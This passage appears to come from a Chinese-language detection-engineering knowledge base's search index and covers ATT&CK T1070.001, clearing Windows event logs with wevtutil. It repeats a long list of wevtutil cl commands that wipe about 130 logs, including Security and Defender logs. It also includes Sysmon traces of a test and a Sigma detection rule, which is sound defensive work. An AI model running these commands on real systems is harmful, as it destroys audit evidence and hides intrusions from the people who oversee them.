\u5728\u57fa\u4e8e\u7279\u5f81\u76d1\u6d4b\u7684\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u963b\u6b62\u76d1\u6d4b\u7279\u5f81\u76f8\u5173\u7684\u6570\u636e\u88ab\u53d1\u9001\u51fa\u53bb\uff0c\u4ee5\u4fbf\u4e8e\u963b\u6b62\u5b89\u5168\u4eba\u5458\u8fdb\u884c\u5206\u6790\u3002\u8fd9\u53ef\u4ee5\u6709\u5f88\u591a\u65b9\u5f0f\u5b9e\u73b0\uff0c\u4f8b\u5982\u505c\u6b62\u8d1f\u8d23\u8f6c\u53d1\u7684\u8fdb\u7a0b\uff08splunk\u8f6c\u53d1\u5668\u3001Filebate\u3001rsyslog\u7b49\uff09\u3002 \u5728\u6b63\u5e38\u7684\u64cd\u4f5c\u671f\u95f4\u5185\uff0c\u4e8b\u4ef6\u65e5\u5fd7\u4e0d\u592a\u53ef\u80fd\u4f1a\u88ab\u523b\u610f\u6e05\u9664\u3002\u4f46\u662f\u6076\u610f\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7\u6765\u5c1d\u8bd5\u63a9\u76d6\u81ea\u5df1\u7684\u8e2a\u8ff9\u3002\u5f53\u4e8b\u4ef6\u65e5\u5fd7\u88ab\u6e05\u9664\u65f6\uff0c\u5b83\u662f\u53ef\u7591\u7684\u3002\u53d1\u73b0\u201c\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7\u201d\u65f6\u53ef\u80fd\u610f\u5473\u7740\u6709\u6076\u610f\u653b\u51fb\u8005\u5229\u7528\u4e86\u6b64\u9879\u6280\u672f\u3002 \u96c6\u4e2d\u6536\u96c6\u4e8b\u4ef6\u65e5\u5fd7\u7684\u4e00\u4e2a\u597d\u5904\u5c31\u662f\u4f7f\u653b\u51fb\u8005\u66f4\u96be\u4ee5\u63a9\u76d6\u4ed6\u4eec\u7684\u8e2a\u8ff9\uff0c\u4e8b\u4ef6\u8f6c\u53d1\u5141\u8bb8\u5c06\u6536\u96c6\u5230\u7684\u7cfb\u7edf\u4e8b\u4ef6\u65e5\u5fd7\u53d1\u9001\u7ed9\u591a\u4e2a\u6536\u96c6\u5668\uff08splunk\u3001elk\u7b49\uff09\uff0c\u4ece\u800c\u5b9e\u73b0\u5197\u4f59\u4e8b\u4ef6\u6536\u96c6\u3002\u4f7f\u7528\u5197\u4f59\u4e8b\u4ef6\u6536\u96c6\uff0c\u53ef\u4ee5\u6700\u5927\u9650\u5ea6\u7684\u5e2e\u52a9\u6211\u4eec\u53d1\u73b0\u5a01\u80c1\u3002 \u6d4b\u8bd5\u6848\u4f8b wevtutil.exe cl \"ACEEventLog\" wevtutil.exe cl \"Application\" wevtutil.exe cl \"HardwareEvents\" wevtutil.exe cl \"Internet Explorer\" wevtutil.exe cl \"Key Management Service\" wevtutil.exe cl \"Media Center\" wevtutil.exe cl \"Microsoft-Windows-API-Tracing/Operational\" wevtutil.exe cl \"Microsoft-Windows-AppID/Operational\" wevtutil.exe cl \"Microsoft-Windows-Application-Experience/Problem-Steps-Recorder\" wevtutil.exe cl \"Microsoft-Windows-Application-Experience/Program-Compatibility-Assistant\" wevtutil.exe cl \"Microsoft-Windows-Application-Experience/Program-Compatibility-Troubleshooter\" wevtutil.exe cl \"Microsoft-Windows-Application-Experience/Program-Inventory\" wevtutil.exe cl \"Microsoft-Windows-Application-Experience/Program-Telemetry\" wevtutil.exe cl \"Microsoft-Windows-AppLocker/EXE and DLL\" wevtutil.exe cl \"Microsoft-Windows-AppLocker/MSI and Script\" wevtutil.exe cl \"Microsoft-Windows-Audio/CaptureMonitor\" wevtutil.exe cl \"Microsoft-Windows-Audio/Operational\" wevtutil.exe cl \"Microsoft-Windows-Authentication User Interface/Operational\" wevtutil.exe cl \"Microsoft-Windows-Backup\" wevtutil.exe cl \"Microsoft-Windows-BitLocker-DrivePreparationTool/Admin\" wevtutil.exe cl \"Microsoft-Windows-BitLocker-DrivePreparationTool/Operational\" wevtutil.exe cl \"Microsoft-Windows-Bits-Client/Operational\" wevtutil.exe cl \"Microsoft-Windows-Bluetooth-MTPEnum/Operational\" wevtutil.exe cl \"Microsoft-Windows-BranchCache/Operational\" wevtutil.exe cl \"Microsoft-Windows-BranchCacheSMB/Operational\" wevtutil.exe cl \"Microsoft-Windows-CodeIntegrity/Operational\" wevtutil.exe cl \"Microsoft-Windows-CorruptedFileRecovery-Client/Operational\" wevtutil.exe cl \"Microsoft-Windows-CorruptedFileRecovery-Server/Operational\" wevtutil.exe cl \"Microsoft-Windows-DateTimeControlPanel/Operational\" wevtutil.exe cl \"Microsoft-Windows-DeviceSync/Operational\" wevtutil.exe cl \"Microsoft-Windows-Dhcp-Client/Admin\" wevtutil.exe cl \"Microsoft-Windows-DhcpNap/Admin\" wevtutil.exe cl \"Microsoft-Windows-Dhcpv6-Client/Admin\" wevtutil.exe cl \"Microsoft-Windows-Diagnosis-DPS/Operational\" wevtutil.exe cl \"Microsoft-Windows-Diagnosis-PCW/Operational\" wevtutil.exe cl \"Microsoft-Windows-Diagnosis-PLA/Operational\" wevtutil.exe cl \"Microsoft-Windows-Diagnosis-Scheduled/Operational\" wevtutil.exe cl \"Microsoft-Windows-Diagnosis-Scripted/Admin\" wevtutil.exe cl \"Microsoft-Windows-Diagnosis-Scripted/Operational\" wevtutil.exe cl \"Microsoft-Windows-Diagnosis-ScriptedDiagnosticsProvider/Operational\" wevtutil.exe cl \"Microsoft-Windows-Diagnostics-Networking/Operational\" wevtutil.exe cl \"Microsoft-Windows-Diagnostics-Performance/Operational\" wevtutil.exe cl \"Microsoft-Windows-DiskDiagnostic/Operational\" wevtutil.exe cl \"Microsoft-Windows-DiskDiagnosticDataCollector/Operational\" wevtutil.exe cl \"Microsoft-Windows-DiskDiagnosticResolver/Operational\" wevtutil.exe cl \"Microsoft-Windows-DriverFrameworks-UserMode/Operational\" wevtutil.exe cl \"Microsoft-Windows-EapHost/Operational\" wevtutil.exe cl \"Microsoft-Windows-EventCollector/Operational\" wevtutil.exe cl \"Microsoft-Windows-Fault-Tolerant-Heap/Operational\" wevtutil.exe cl \"Microsoft-Windows-FMS/Operational\" wevtutil.exe cl \"Microsoft-Windows-Folder Redirection/Operational\" wevtutil.exe cl \"Microsoft-Windows-Forwarding/Operational\" wevtutil.exe cl \"Microsoft-Windows-GroupPolicy/Operational\" wevtutil.exe cl \"Microsoft-Windows-Help/Operational\" wevtutil.exe cl \"Microsoft-Windows-HomeGroup Control Panel/Operational\" wevtutil.exe cl \"Microsoft-Windows-HomeGroup Listener Service/Operational\" wevtutil.exe cl \"Microsoft-Windows-HomeGroup Provider Service/Operational\" wevtutil.exe cl \"Microsoft-Windows-IKE/Operational\" wevtutil.exe cl \"Microsoft-Windows-International/Operational\" wevtutil.exe cl \"Microsoft-Windows-International-RegionalOptionsControlPanel/Operational\" wevtutil.exe cl \"Microsoft-Windows-Iphlpsvc/Operational\" wevtutil.exe cl \"Microsoft-Windows-Kernel-EventTracing/Admin\" wevtutil.exe cl \"Microsoft-Windows-Kernel-Power/Thermal-Operational\" wevtutil.exe cl \"Microsoft-Windows-Kernel-StoreMgr/Operational\" wevtutil.exe cl \"Microsoft-Windows-Kernel-WDI/Operational\" wevtutil.exe cl \"Microsoft-Windows-Kernel-WHEA/Errors\" wevtutil.exe cl \"Microsoft-Windows-Kernel-WHEA/Operational\" wevtutil.exe cl \"Microsoft-Windows-Known Folders API Service\" wevtutil.exe cl \"Microsoft-Windows-LanguagePackSetup/Operational\" wevtutil.exe cl \"Microsoft-Windows-MCT/Operational\" wevtutil.exe cl \"Microsoft-Windows-MemoryDiagnostics-Results/Debug\" wevtutil.exe cl \"Microsoft-Windows-MUI/Admin\" wevtutil.exe cl \"Microsoft-Windows-MUI/Operational\" wevtutil.exe cl \"Microsoft-Windows-NCSI/Operational\" wevtutil.exe cl \"Microsoft-Windows-NetworkAccessProtection/Operational\" wevtutil.exe cl \"Microsoft-Windows-NetworkAccessProtection/WHC\" wevtutil.exe cl \"Microsoft-Windows-NetworkLocationWizard/Operational\" wevtutil.exe cl \"Microsoft-Windows-NetworkProfile/Operational\" wevtutil.exe cl \"Microsoft-Windows-NlaSvc/Operational\" wevtutil.exe cl \"Microsoft-Windows-NTLM/Operational\" wevtutil.exe cl \"Microsoft-Windows-OfflineFiles/Operational\" wevtutil.exe cl \"Microsoft-Windows-ParentalControls/Operational\" wevtutil.exe cl \"Microsoft-Windows-PeopleNearMe/Operational\" wevtutil.exe cl \"Microsoft-Windows-PowerShell/Operational\" wevtutil.exe cl \"Microsoft-Windows-PrintService/Admin\" wevtutil.exe cl \"Microsoft-Windows-ReadyBoost/Operational\" wevtutil.exe cl \"Microsoft-Windows-ReadyBoostDriver/Operational\" wevtutil.exe cl \"Microsoft-Windows-Recovery/Operational\" wevtutil.exe cl \"Microsoft-Windows-ReliabilityAnalysisComponent/Operational\" wevtutil.exe cl \"Microsoft-Windows-RemoteApp and Desktop Connections/Admin\" wevtutil.exe cl \"Microsoft-Windows-RemoteAssistance/Admin\" wevtutil.exe cl \"Microsoft-Windows-RemoteAssistance/Operational\" wevtutil.exe cl \"Microsoft-Windows-Resource-Exhaustion-Detector/Operational\" wevtutil.exe cl \"Microsoft-Windows-Resource-Exhaustion-Resolver/Operational\" wevtutil.exe cl \"Microsoft-Windows-Resource-Leak-Diagnostic/Operational\" wevtutil.exe cl \"Microsoft-Windows-RestartManager/Operational\" wevtutil.exe cl \"Microsoft-Windows-Security-Audit-Configuration-Client/Operational\" wevtutil.exe cl \"Microsoft-Windows-TerminalServices-LocalSessionManager/Admin\" wevtutil.exe cl \"Microsoft-Windows-TerminalServices-LocalSessionManager/Operational\" wevtutil.exe cl \"Microsoft-Windows-TerminalServices-PnPDevices/Admin\" wevtutil.exe cl \"Microsoft-Windows-TerminalServices-PnPDevices/Operational\" wevtutil.exe cl \"Microsoft-Windows-TerminalServices-RDPClient/Operational\" wevtutil.exe cl \"Microsoft-Windows-TerminalServices-RemoteConnectionManager/Admin\" wevtutil.exe cl \"Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational\" wevtutil.exe cl \"Microsoft-Windows-TZUtil/Operational\" wevtutil.exe cl \"Microsoft-Windows-UAC/Operational\" wevtutil.exe cl \"Microsoft-Windows-UAC-FileVirtualization/Operational\" wevtutil.exe cl \"Microsoft-Windows-User Profile Service/Operational\" wevtutil.exe cl \"Microsoft-Windows-VDRVROOT/Operational\" wevtutil.exe cl \"Microsoft-Windows-VHDMP/Operational\" wevtutil.exe cl \"Microsoft-Windows-WER-Diag/Operational\" wevtutil.exe cl \"Microsoft-Windows-WFP/Operational\" wevtutil.exe cl \"Microsoft-Windows-Windows Defender/Operational\" wevtutil.exe cl \"Microsoft-Windows-Windows Defender/WHC\" wevtutil.exe cl \"Microsoft-Windows-Windows Firewall With Advanced Security/ConnectionSecurity\" wevtutil.exe cl \"Microsoft-Windows-Windows Firewall With Advanced Security/Firewall\" wevtutil.exe cl \"Microsoft-Windows-WindowsBackup/ActionCenter\" wevtutil.exe cl \"Microsoft-Windows-WindowsSystemAssessmentTool/Operational\" wevtutil.exe cl \"Microsoft-Windows-WindowsUpdateClient/Operational\" wevtutil.exe cl \"Microsoft-Windows-Winlogon/Operational\" wevtutil.exe cl \"Microsoft-Windows-WinRM/Operational\" wevtutil.exe cl \"Microsoft-Windows-Winsock-WS2HELP/Operational\" wevtutil.exe cl \"Microsoft-Windows-Wired-AutoConfig/Operational\" wevtutil.exe cl \"Microsoft-Windows-WLAN-AutoConfig/Operational\" wevtutil.exe cl \"Microsoft-Windows-WPD-ClassInstaller/Operational\" wevtutil.exe cl \"Microsoft-Windows-WPD-CompositeClassDriver/Operational\" wevtutil.exe cl \"Microsoft-Windows-WPD-MTPClassDriver/Operational\" wevtutil.exe cl \"ODiag\" wevtutil.exe cl \"OSession\" wevtutil.exe cl \"Security\" wevtutil.exe cl \"Setup\" wevtutil.exe cl \"System\" wevtutil.exe cl \"Windows PowerShell\" \u68c0\u6d4b\u65e5\u5fd7 windows sysmon \u6d4b\u8bd5\u590d\u73b0 C:\\Windows\\system32>wevtutil cl security \u6d4b\u8bd5\u7559\u75d5 sysmon_log Process Create: RuleName: - UtcTime: 2020-11-29 13:15:07.077 ProcessGuid: {bb1f7c32-9edb-5fc3-8100-000000001900} ProcessId: 1908 Image: C:\\Windows\\System32\\wevtutil.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: Eventing Command Line Utility Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation OriginalFileName: wevtutil.exe CommandLine: wevtutil cl security CurrentDirectory: C:\\Windows\\system32\\ User: 12306Br0-PC\\12306Br0 LogonGuid: {bb1f7c32-7b3c-5fc3-f960-060000000000} LogonId: 0x660f9 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=BDCF4B78B6D6F45EDC9D226CE05B7ADC3B366248 ParentProcessGuid: {bb1f7c32-7b69-5fc3-5000-000000001900} ParentProcessId: 3328 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\System32\\cmd.exe\" windows_security_log \u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u4f7f\u7528\u8005: \u5b89\u5168 ID: 12306Br0-PC\\12306Br0 \u5e10\u6237\u540d\u79f0: 12306Br0 \u5e10\u6237\u57df: 12306Br0-PC \u767b\u5f55 ID: 0x660f9 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x774 \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\wevtutil.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: TokenElevationTypeFull (2) \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0xd00 \u8fdb\u7a0b\u547d\u4ee4\u884c: #\u672a\u5f00\u542f\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\u5ba1\u6838\uff0c\u6240\u4ee5\u6b64\u5904\u4e3a\u7a7a \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma title: windows \u65e5\u5fd7\u6e05\u9664 description: win7\u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c status: experimental author: 12306Bro logsource: \u200b product: windows \u200b service: security detection: \u200b selection1: \u200b EventID: \u200b - 1 #sysmon \u200b - 4688 #Windows \u5b89\u5168\u65e5\u5fd7 Process.name: 'wevtutil.exe' #Application Name Commanline: 'cl' selection2: Process.name: 'powershell.exe' #Application Name Commanline: 'Clear-EventLog' \u200b condition: selection1 OR selection2 level: medium \u5efa\u8bae \u5982\u679c\u4f60\u60f3\u57fa\u4e8ewindows\u65e5\u5fd7\u8fdb\u884c\u68c0\u6d4b\uff0c\u90a3\u4e48\u4f60\u9700\u8981\u7559\u610f\u5728\u4ea7\u751f\u4e861102\uff08\u65e5\u5fd7\u6e05\u9664\uff09\u540e\uff0cwevtutil\u8fdb\u7a0b\uff084688/4689\uff09\u7684\u8c03\u7528\u60c5\u51b5\u3002\u81f3\u5c11\uff0c\u5b83\u5728\u6211\u7684\u6d4b\u8bd5\u73af\u5883\u4e2d\u662f\u8fd9\u4e48\u8868\u73b0\u7684\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1070-001 https://attack.mitre.org/techniques/T1070/001/ powershell:Clear-EventLog https://blog.csdn.net/weixin_30800807/article/details/97087311","title":"T1070-001-win-\u4f7f\u7528wevtutil\u547d\u4ee4\u5220\u9664\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/#t1070-001-win-wevtutil","text":"","title":"T1070-001-win-\u4f7f\u7528wevtutil\u547d\u4ee4\u5220\u9664\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u963b\u6b62\u7531\u76d1\u6d4b\u8f6f\u4ef6\u6216\u8fdb\u7a0b\u6355\u83b7\u5230\u7684\u544a\u8b66\uff0c\u4ee5\u53ca\u4e8b\u4ef6\u65e5\u5fd7\u88ab\u6536\u96c6\u548c\u5206\u6790\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u6216\u6ce8\u518c\u8868\u9879\u4e2d\u7684\u76d1\u6d4b\u8f6f\u4ef6\u7684\u8bbe\u7f6e\uff0c\u4ee5\u8fbe\u5230\u9003\u907f\u8ffd\u8e2a\u7684\u76ee\u7684\u3002 \u5728\u57fa\u4e8e\u7279\u5f81\u76d1\u6d4b\u7684\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u963b\u6b62\u76d1\u6d4b\u7279\u5f81\u76f8\u5173\u7684\u6570\u636e\u88ab\u53d1\u9001\u51fa\u53bb\uff0c\u4ee5\u4fbf\u4e8e\u963b\u6b62\u5b89\u5168\u4eba\u5458\u8fdb\u884c\u5206\u6790\u3002\u8fd9\u53ef\u4ee5\u6709\u5f88\u591a\u65b9\u5f0f\u5b9e\u73b0\uff0c\u4f8b\u5982\u505c\u6b62\u8d1f\u8d23\u8f6c\u53d1\u7684\u8fdb\u7a0b\uff08splunk\u8f6c\u53d1\u5668\u3001Filebate\u3001rsyslog\u7b49\uff09\u3002 \u5728\u6b63\u5e38\u7684\u64cd\u4f5c\u671f\u95f4\u5185\uff0c\u4e8b\u4ef6\u65e5\u5fd7\u4e0d\u592a\u53ef\u80fd\u4f1a\u88ab\u523b\u610f\u6e05\u9664\u3002\u4f46\u662f\u6076\u610f\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7\u6765\u5c1d\u8bd5\u63a9\u76d6\u81ea\u5df1\u7684\u8e2a\u8ff9\u3002\u5f53\u4e8b\u4ef6\u65e5\u5fd7\u88ab\u6e05\u9664\u65f6\uff0c\u5b83\u662f\u53ef\u7591\u7684\u3002\u53d1\u73b0\u201c\u6e05\u9664\u4e8b\u4ef6\u65e5\u5fd7\u201d\u65f6\u53ef\u80fd\u610f\u5473\u7740\u6709\u6076\u610f\u653b\u51fb\u8005\u5229\u7528\u4e86\u6b64\u9879\u6280\u672f\u3002 \u96c6\u4e2d\u6536\u96c6\u4e8b\u4ef6\u65e5\u5fd7\u7684\u4e00\u4e2a\u597d\u5904\u5c31\u662f\u4f7f\u653b\u51fb\u8005\u66f4\u96be\u4ee5\u63a9\u76d6\u4ed6\u4eec\u7684\u8e2a\u8ff9\uff0c\u4e8b\u4ef6\u8f6c\u53d1\u5141\u8bb8\u5c06\u6536\u96c6\u5230\u7684\u7cfb\u7edf\u4e8b\u4ef6\u65e5\u5fd7\u53d1\u9001\u7ed9\u591a\u4e2a\u6536\u96c6\u5668\uff08splunk\u3001elk\u7b49\uff09\uff0c\u4ece\u800c\u5b9e\u73b0\u5197\u4f59\u4e8b\u4ef6\u6536\u96c6\u3002\u4f7f\u7528\u5197\u4f59\u4e8b\u4ef6\u6536\u96c6\uff0c\u53ef\u4ee5\u6700\u5927\u9650\u5ea6\u7684\u5e2e\u52a9\u6211\u4eec\u53d1\u73b0\u5a01\u80c1\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/#_1","text":"wevtutil.exe cl \"ACEEventLog\" wevtutil.exe cl \"Application\" wevtutil.exe cl \"HardwareEvents\" wevtutil.exe cl \"Internet Explorer\" wevtutil.exe cl \"Key Management Service\" wevtutil.exe cl \"Media Center\" wevtutil.exe cl \"Microsoft-Windows-API-Tracing/Operational\" wevtutil.exe cl \"Microsoft-Windows-AppID/Operational\" wevtutil.exe cl \"Microsoft-Windows-Application-Experience/Problem-Steps-Recorder\" wevtutil.exe cl \"Microsoft-Windows-Application-Experience/Program-Compatibility-Assistant\" wevtutil.exe cl \"Microsoft-Windows-Application-Experience/Program-Compatibility-Troubleshooter\" wevtutil.exe cl \"Microsoft-Windows-Application-Experience/Program-Inventory\" wevtutil.exe cl \"Microsoft-Windows-Application-Experience/Program-Telemetry\" wevtutil.exe cl \"Microsoft-Windows-AppLocker/EXE and DLL\" wevtutil.exe cl \"Microsoft-Windows-AppLocker/MSI and Script\" wevtutil.exe cl \"Microsoft-Windows-Audio/CaptureMonitor\" wevtutil.exe cl \"Microsoft-Windows-Audio/Operational\" wevtutil.exe cl \"Microsoft-Windows-Authentication User Interface/Operational\" wevtutil.exe cl \"Microsoft-Windows-Backup\" wevtutil.exe cl \"Microsoft-Windows-BitLocker-DrivePreparationTool/Admin\" wevtutil.exe cl \"Microsoft-Windows-BitLocker-DrivePreparationTool/Operational\" wevtutil.exe cl \"Microsoft-Windows-Bits-Client/Operational\" wevtutil.exe cl \"Microsoft-Windows-Bluetooth-MTPEnum/Operational\" wevtutil.exe cl \"Microsoft-Windows-BranchCache/Operational\" wevtutil.exe cl \"Microsoft-Windows-BranchCacheSMB/Operational\" wevtutil.exe cl \"Microsoft-Windows-CodeIntegrity/Operational\" wevtutil.exe cl \"Microsoft-Windows-CorruptedFileRecovery-Client/Operational\" wevtutil.exe cl \"Microsoft-Windows-CorruptedFileRecovery-Server/Operational\" wevtutil.exe cl \"Microsoft-Windows-DateTimeControlPanel/Operational\" wevtutil.exe cl \"Microsoft-Windows-DeviceSync/Operational\" wevtutil.exe cl \"Microsoft-Windows-Dhcp-Client/Admin\" wevtutil.exe cl \"Microsoft-Windows-DhcpNap/Admin\" wevtutil.exe cl \"Microsoft-Windows-Dhcpv6-Client/Admin\" wevtutil.exe cl \"Microsoft-Windows-Diagnosis-DPS/Operational\" wevtutil.exe cl \"Microsoft-Windows-Diagnosis-PCW/Operational\" wevtutil.exe cl \"Microsoft-Windows-Diagnosis-PLA/Operational\" wevtutil.exe cl \"Microsoft-Windows-Diagnosis-Scheduled/Operational\" wevtutil.exe cl \"Microsoft-Windows-Diagnosis-Scripted/Admin\" wevtutil.exe cl \"Microsoft-Windows-Diagnosis-Scripted/Operational\" wevtutil.exe cl \"Microsoft-Windows-Diagnosis-ScriptedDiagnosticsProvider/Operational\" wevtutil.exe cl \"Microsoft-Windows-Diagnostics-Networking/Operational\" wevtutil.exe cl \"Microsoft-Windows-Diagnostics-Performance/Operational\" wevtutil.exe cl \"Microsoft-Windows-DiskDiagnostic/Operational\" wevtutil.exe cl \"Microsoft-Windows-DiskDiagnosticDataCollector/Operational\" wevtutil.exe cl \"Microsoft-Windows-DiskDiagnosticResolver/Operational\" wevtutil.exe cl \"Microsoft-Windows-DriverFrameworks-UserMode/Operational\" wevtutil.exe cl \"Microsoft-Windows-EapHost/Operational\" wevtutil.exe cl \"Microsoft-Windows-EventCollector/Operational\" wevtutil.exe cl \"Microsoft-Windows-Fault-Tolerant-Heap/Operational\" wevtutil.exe cl \"Microsoft-Windows-FMS/Operational\" wevtutil.exe cl \"Microsoft-Windows-Folder Redirection/Operational\" wevtutil.exe cl \"Microsoft-Windows-Forwarding/Operational\" wevtutil.exe cl \"Microsoft-Windows-GroupPolicy/Operational\" wevtutil.exe cl \"Microsoft-Windows-Help/Operational\" wevtutil.exe cl \"Microsoft-Windows-HomeGroup Control Panel/Operational\" wevtutil.exe cl \"Microsoft-Windows-HomeGroup Listener Service/Operational\" wevtutil.exe cl \"Microsoft-Windows-HomeGroup Provider Service/Operational\" wevtutil.exe cl \"Microsoft-Windows-IKE/Operational\" wevtutil.exe cl \"Microsoft-Windows-International/Operational\" wevtutil.exe cl \"Microsoft-Windows-International-RegionalOptionsControlPanel/Operational\" wevtutil.exe cl \"Microsoft-Windows-Iphlpsvc/Operational\" wevtutil.exe cl \"Microsoft-Windows-Kernel-EventTracing/Admin\" wevtutil.exe cl \"Microsoft-Windows-Kernel-Power/Thermal-Operational\" wevtutil.exe cl \"Microsoft-Windows-Kernel-StoreMgr/Operational\" wevtutil.exe cl \"Microsoft-Windows-Kernel-WDI/Operational\" wevtutil.exe cl \"Microsoft-Windows-Kernel-WHEA/Errors\" wevtutil.exe cl \"Microsoft-Windows-Kernel-WHEA/Operational\" wevtutil.exe cl \"Microsoft-Windows-Known Folders API Service\" wevtutil.exe cl \"Microsoft-Windows-LanguagePackSetup/Operational\" wevtutil.exe cl \"Microsoft-Windows-MCT/Operational\" wevtutil.exe cl \"Microsoft-Windows-MemoryDiagnostics-Results/Debug\" wevtutil.exe cl \"Microsoft-Windows-MUI/Admin\" wevtutil.exe cl \"Microsoft-Windows-MUI/Operational\" wevtutil.exe cl \"Microsoft-Windows-NCSI/Operational\" wevtutil.exe cl \"Microsoft-Windows-NetworkAccessProtection/Operational\" wevtutil.exe cl \"Microsoft-Windows-NetworkAccessProtection/WHC\" wevtutil.exe cl \"Microsoft-Windows-NetworkLocationWizard/Operational\" wevtutil.exe cl \"Microsoft-Windows-NetworkProfile/Operational\" wevtutil.exe cl \"Microsoft-Windows-NlaSvc/Operational\" wevtutil.exe cl \"Microsoft-Windows-NTLM/Operational\" wevtutil.exe cl \"Microsoft-Windows-OfflineFiles/Operational\" wevtutil.exe cl \"Microsoft-Windows-ParentalControls/Operational\" wevtutil.exe cl \"Microsoft-Windows-PeopleNearMe/Operational\" wevtutil.exe cl \"Microsoft-Windows-PowerShell/Operational\" wevtutil.exe cl \"Microsoft-Windows-PrintService/Admin\" wevtutil.exe cl \"Microsoft-Windows-ReadyBoost/Operational\" wevtutil.exe cl \"Microsoft-Windows-ReadyBoostDriver/Operational\" wevtutil.exe cl \"Microsoft-Windows-Recovery/Operational\" wevtutil.exe cl \"Microsoft-Windows-ReliabilityAnalysisComponent/Operational\" wevtutil.exe cl \"Microsoft-Windows-RemoteApp and Desktop Connections/Admin\" wevtutil.exe cl \"Microsoft-Windows-RemoteAssistance/Admin\" wevtutil.exe cl \"Microsoft-Windows-RemoteAssistance/Operational\" wevtutil.exe cl \"Microsoft-Windows-Resource-Exhaustion-Detector/Operational\" wevtutil.exe cl \"Microsoft-Windows-Resource-Exhaustion-Resolver/Operational\" wevtutil.exe cl \"Microsoft-Windows-Resource-Leak-Diagnostic/Operational\" wevtutil.exe cl \"Microsoft-Windows-RestartManager/Operational\" wevtutil.exe cl \"Microsoft-Windows-Security-Audit-Configuration-Client/Operational\" wevtutil.exe cl \"Microsoft-Windows-TerminalServices-LocalSessionManager/Admin\" wevtutil.exe cl \"Microsoft-Windows-TerminalServices-LocalSessionManager/Operational\" wevtutil.exe cl \"Microsoft-Windows-TerminalServices-PnPDevices/Admin\" wevtutil.exe cl \"Microsoft-Windows-TerminalServices-PnPDevices/Operational\" wevtutil.exe cl \"Microsoft-Windows-TerminalServices-RDPClient/Operational\" wevtutil.exe cl \"Microsoft-Windows-TerminalServices-RemoteConnectionManager/Admin\" wevtutil.exe cl \"Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational\" wevtutil.exe cl \"Microsoft-Windows-TZUtil/Operational\" wevtutil.exe cl \"Microsoft-Windows-UAC/Operational\" wevtutil.exe cl \"Microsoft-Windows-UAC-FileVirtualization/Operational\" wevtutil.exe cl \"Microsoft-Windows-User Profile Service/Operational\" wevtutil.exe cl \"Microsoft-Windows-VDRVROOT/Operational\" wevtutil.exe cl \"Microsoft-Windows-VHDMP/Operational\" wevtutil.exe cl \"Microsoft-Windows-WER-Diag/Operational\" wevtutil.exe cl \"Microsoft-Windows-WFP/Operational\" wevtutil.exe cl \"Microsoft-Windows-Windows Defender/Operational\" wevtutil.exe cl \"Microsoft-Windows-Windows Defender/WHC\" wevtutil.exe cl \"Microsoft-Windows-Windows Firewall With Advanced Security/ConnectionSecurity\" wevtutil.exe cl \"Microsoft-Windows-Windows Firewall With Advanced Security/Firewall\" wevtutil.exe cl \"Microsoft-Windows-WindowsBackup/ActionCenter\" wevtutil.exe cl \"Microsoft-Windows-WindowsSystemAssessmentTool/Operational\" wevtutil.exe cl \"Microsoft-Windows-WindowsUpdateClient/Operational\" wevtutil.exe cl \"Microsoft-Windows-Winlogon/Operational\" wevtutil.exe cl \"Microsoft-Windows-WinRM/Operational\" wevtutil.exe cl \"Microsoft-Windows-Winsock-WS2HELP/Operational\" wevtutil.exe cl \"Microsoft-Windows-Wired-AutoConfig/Operational\" wevtutil.exe cl \"Microsoft-Windows-WLAN-AutoConfig/Operational\" wevtutil.exe cl \"Microsoft-Windows-WPD-ClassInstaller/Operational\" wevtutil.exe cl \"Microsoft-Windows-WPD-CompositeClassDriver/Operational\" wevtutil.exe cl \"Microsoft-Windows-WPD-MTPClassDriver/Operational\" wevtutil.exe cl \"ODiag\" wevtutil.exe cl \"OSession\" wevtutil.exe cl \"Security\" wevtutil.exe cl \"Setup\" wevtutil.exe cl \"System\" wevtutil.exe cl \"Windows PowerShell\"","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1070-001-win-%E4%BD%BF%E7%94%A8wevtutil%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%97%A5%E5%BF%97/#_2","text":"windows 